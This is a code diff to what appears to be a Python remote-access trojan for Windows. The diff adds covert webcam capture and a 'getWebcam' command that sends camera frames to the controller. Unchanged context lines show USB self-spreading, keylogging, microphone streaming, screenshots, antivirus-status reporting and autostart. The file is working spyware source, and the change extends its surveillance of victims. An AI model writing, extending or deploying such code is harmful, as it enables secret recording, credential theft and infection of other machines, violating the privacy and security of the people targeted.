@@ -13,8 +13,9 @@ import platform
 import zlib
 import pyaudio
 import shutil
+import vidcap
 
-TEST_MODE = True
+DEBUG_MODE = True
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -26,6 +27,20 @@ __version__ = '1.0'
 __ostype__ = str(sys.platform)
 __os__ = str(platform.platform())
 __user__ = os.path.expanduser('~').split('\\')[-1]
+
+try:
+    cam = vidcap.new_Dev(0, 0)
+    web_camera = str(cam.getdisplayname())
+except:
+    web_camera = 'NoDevice'
+
+try:
+    p = pyaudio.PyAudio()
+    device_name = p.get_default_input_device_info()
+    del p
+    audio_input = device_name['name']
+except IOError:
+    audio_input = 'NoDevice'
 
 Kernel32 = ctypes.windll.kernel32
 User32 = ctypes.windll.user32
@@ -125,7 +140,6 @@ updateCode = {
     110: '.'
 }
 
-
 class UsbSpread(threading.Thread):
 
     def run(self):
@@ -209,7 +223,8 @@ def pc_info():
         'os': __os__,
         'protection': str(active),
         'user': __user__,
-        'inputdevice': get_default_input_device(),
+        'inputdevice': audio_input,
+        'webcamdevice': web_camera,
         'activewindowtitle': get_window_title(),
     })
 
@@ -282,16 +297,6 @@ def download(sock, filename, end="[ENDOFMESSAGE]"):
         return 'downloadError'
 
 
-def get_default_input_device():
-    try:
-        p = pyaudio.PyAudio()
-        device_name = p.get_default_input_device_info()
-        del p
-        return device_name['name']
-    except IOError:
-        return 'NoDevice'
-
-
 def screen_bits():
     h_desktop_dc = User32.GetWindowDC(hDesktopWnd)
     h_capture_dc = Gdi32.CreateCompatibleDC(h_desktop_dc)
@@ -356,6 +361,15 @@ def get_screenshot():
         'width': width,
         'height': height,
         'screenshotbits': screen_bits()
+    })
+
+
+def webcam_shot():
+    buff, width, height = cam.getbuffer()
+    return str({
+        'webcambits': zlib.compress(buff),
+        'width': width,
+        'height': height,
     })
 
 
@@ -445,7 +459,7 @@ class ChildSocket(threading.Thread):
                     except:
                         stdoutput = 'downloadError'
                 elif data.startswith('getDefaultInputDeviceName'):
-                    stdoutput = get_default_input_device()
+                    stdoutput = audio_input
                 elif data.startswith('startAudio'):
                     try:
                         audio_thread = AudioStreaming(self.socket, int(data.split(' ')[-1]))
@@ -478,8 +492,6 @@ class ChildSocket(threading.Thread):
                         keylogger_thread.logs = {}
                     except AttributeError:
                         stdoutput = 'keystokesError'
-                elif data.startswith('getScreenshot'):
-                    stdoutput = get_screenshot()
                 elif data.startswith("cd"):
                     try:
                         os.chdir(data[3:])
@@ -627,6 +639,9 @@ def from_autostart():
                 if data == 'getScreen':
                     send(s, get_screenshot(), mode)
                     continue
+                if data == 'getWebcam':
+                    send(s, webcam_shot(), mode)
+                    continue
                 if data.startswith('startChildSocket'):
                     send(s, start_child_socket(str(data.split(' ')[-1]), mode), mode)
                     continue
@@ -658,7 +673,37 @@ def from_autostart():
                 time.sleep(10)
                 break
 
-if TEST_MODE:
+
+def handle_exception(exc_type, exc_value, exc_traceback):
+    import datetime
+    now = datetime.datetime.now()
+    filename = exc_traceback.tb_frame
+    log_value = '''
+DATE: %s/%s/%s %s:%s:%s
+FILE: %s
+LINE: %s
+####################################
+# Exception Type: %s
+# Exception Value: %s
+# Exception Object: %s
+####################################
+    ''' % (now.year,
+           now.month,
+           now.day,
+           now.hour,
+           now.minute,
+           now.second,
+           filename.f_code.co_filename,
+           exc_traceback.tb_lineno,
+           exc_type,
+           exc_value,
+           exc_traceback)
+    with open('error.log', 'a') as log_file:
+        log_file.write(log_value)
+
+if DEBUG_MODE:
+    open('error.log', 'w').close()
+    sys.excepthook = handle_exception
     from_autostart()
 else:
     if 'VolumeInformation' in sys.argv[0]:
